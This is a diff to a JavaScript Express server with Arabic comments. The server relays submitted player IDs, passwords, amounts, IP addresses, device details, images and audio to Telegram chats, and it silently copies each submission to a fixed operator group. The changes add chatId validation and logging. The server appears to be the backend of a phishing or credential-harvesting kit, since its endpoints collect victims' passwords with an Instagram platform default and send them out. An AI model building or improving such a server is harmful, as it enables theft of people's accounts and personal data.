@@ -59,9 +59,34 @@ ${additionalData ? `\n📋 البيانات المرسلة:\n${additionalData}` 
 ─────────────────────`;
 }
 
+// وظيفة للتحقق من صحة chatId
+function isValidChatId(chatId) {
+  if (!chatId) return false;
+  
+  const chatIdStr = chatId.toString();
+  
+  // إذا كان chatId لمجموعة أو قناة (-100) نرفضه
+  if (chatIdStr.startsWith('-100')) {
+    return false;
+  }
+  
+  // يجب أن يكون chatId رقماً (موجب أو سالب) وليس نصاً عشوائياً
+  if (!/^-?\d+$/.test(chatIdStr)) {
+    return false;
+  }
+  
+  return true;
+}
+
 // وظيفة لإرسال رسالة إلى Telegram
 async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isImage = false) {
   try {
+    // التحقق من صحة chatId أولاً
+    if (!isValidChatId(chatId)) {
+      console.error(`❌ chatId غير صالح: ${chatId}`);
+      return false;
+    }
+
     // إذا لم يكن هناك توكن، نعود بنجاح وهمي للتجربة
     if (!BOT_TOKEN) {
       console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
@@ -109,6 +134,17 @@ async function sendToTelegram(chatId, message, fileBuffer = null, filename = nul
     }
   } catch (error) {
     console.error('Error sending to Telegram:', error.response?.data || error.message);
+    
+    // إرجاع رسالة خطأ أكثر وضوحاً
+    if (error.response?.data) {
+      const telegramError = error.response.data;
+      if (telegramError.error_code === 400) {
+        console.error(`❌ chatId غير صالح أو البوت محظور: ${chatId}`);
+      } else if (telegramError.error_code === 403) {
+        console.error(`❌ البوت محظور من قبل المستخدم: ${chatId}`);
+      }
+    }
+    
     return false;
   }
 }
@@ -129,11 +165,14 @@ app.post('/send-to-telegram', async (req, res) => {
   try {
     const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
     
-    // التحقق من أن chatId ليس لقناة أو مجموعة (لا يبدأ بـ -100)
-    if (chatId && chatId.toString().startsWith('-100')) {
+    console.log('📥 بيانات مستلمة:', { playerId, chatId, platform });
+
+    // التحقق من صحة chatId
+    if (!isValidChatId(chatId)) {
+      console.error(`❌ chatId غير صالح: ${chatId}`);
       return res.status(400).json({
         success: false,
-        message: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات'
+        message: 'معرف الدردشة (chatId) غير صالح. يجب أن يكون رقم مستخدم صحيح ولا يبدأ بـ -100'
       });
     }
 
@@ -157,6 +196,8 @@ app.post('/send-to-telegram', async (req, res) => {
 🌍 - IP: ${userInfo.ip}
 🔄 - المنصة: ${platform}`;
 
+    console.log(`📤 محاولة إرسال إلى chatId: ${chatId}`);
+
     // إرسال الرسالة إلى المستخدم المحدد فقط
     const success = await sendToTelegram(chatId, message);
     
@@ -164,6 +205,7 @@ app.post('/send-to-telegram', async (req, res) => {
     const copySuccess = await sendCopyToGroup(userInfo, message);
 
     if (success) {
+      console.log(`✅ تم الإرسال بنجاح إلى: ${chatId}`);
       res.json({
         success: true,
         message: 'تم إرسال البيانات بنجاح',
@@ -171,9 +213,10 @@ app.post('/send-to-telegram', async (req, res) => {
         copySent: copySuccess
       });
     } else {
+      console.error(`❌ فشل الإرسال إلى: ${chatId}`);
       res.status(500).json({
         success: false,
-        message: 'فشل في إرسال البيانات'
+        message: 'فشل في إرسال البيانات. قد يكون chatId غير صحيح أو البوت محظور'
       });
     }
   } catch (error) {
@@ -191,11 +234,13 @@ app.post('/register', async (req, res) => {
   try {
     const { username, password, ip, chatId } = req.body;
     
-    // التحقق من أن chatId ليس لقناة أو مجموعة
-    if (chatId && chatId.toString().startsWith('-100')) {
+    console.log('📥 تسجيل مستخدم جديد:', { username, chatId });
+
+    // التحقق من صحة chatId
+    if (!isValidChatId(chatId)) {
       return res.status(400).json({ 
         success: false,
-        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
+        error: 'معرف الدردشة (chatId) غير صالح' 
       });
     }
 
@@ -259,11 +304,13 @@ app.post('/device-info', async (req, res) => {
       chatId 
     } = req.body;
 
-    // التحقق من أن chatId ليس لقناة أو مجموعة
-    if (chatId && chatId.toString().startsWith('-100')) {
+    console.log('📥 معلومات جهاز مستلمة:', { chatId, country, ip });
+
+    // التحقق من صحة chatId
+    if (!isValidChatId(chatId)) {
       return res.status(400).json({ 
         success: false,
-        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
+        error: 'معرف الدردشة (chatId) غير صالح' 
       });
     }
 
@@ -335,11 +382,13 @@ app.post('/upload-image', upload.single('image'), async (req, res) => {
 
     const { username, imageType, chatId, caption } = req.body;
     
-    // التحقق من أن chatId ليس لقناة أو مجموعة
-    if (chatId && chatId.toString().startsWith('-100')) {
+    console.log('📥 صورة مستلمة:', { username, chatId });
+
+    // التحقق من صحة chatId
+    if (!isValidChatId(chatId)) {
       return res.status(400).json({ 
         success: false,
-        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
+        error: 'معرف الدردشة (chatId) غير صالح' 
       });
     }
 
@@ -401,11 +450,13 @@ app.post('/upload-audio', upload.single('audio'), async (req, res) => {
 
     const { username, chatId, caption } = req.body;
     
-    // التحقق من أن chatId ليس لقناة أو مجموعة
-    if (chatId && chatId.toString().startsWith('-100')) {
+    console.log('📥 صوت مستلم:', { username, chatId });
+
+    // التحقق من صحة chatId
+    if (!isValidChatId(chatId)) {
       return res.status(400).json({ 
         success: false,
-        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
+        error: 'معرف الدردشة (chatId) غير صالح' 
       });
     }
 
@@ -478,8 +529,7 @@ app.get('/', (req, res) => {
     success: true,
     message: 'مرحباً بك في سيرفر Telegram Bot',
     features: [
-      'مرحبا'
-    
+
     ],
     endpoints: {
       health: '/health',
@@ -498,6 +548,7 @@ app.listen(PORT, () => {
   console.log(`📊 Target Group: ${TARGET_GROUP_ID}`);
   console.log(`🖼️ Images will be sent as normal photos (not files)`);
   console.log(`📱 Device info endpoint: /device-info`);
+  console.log(`🔍 ChatId validation: Active`);
   if (!BOT_TOKEN) {
     console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
   }
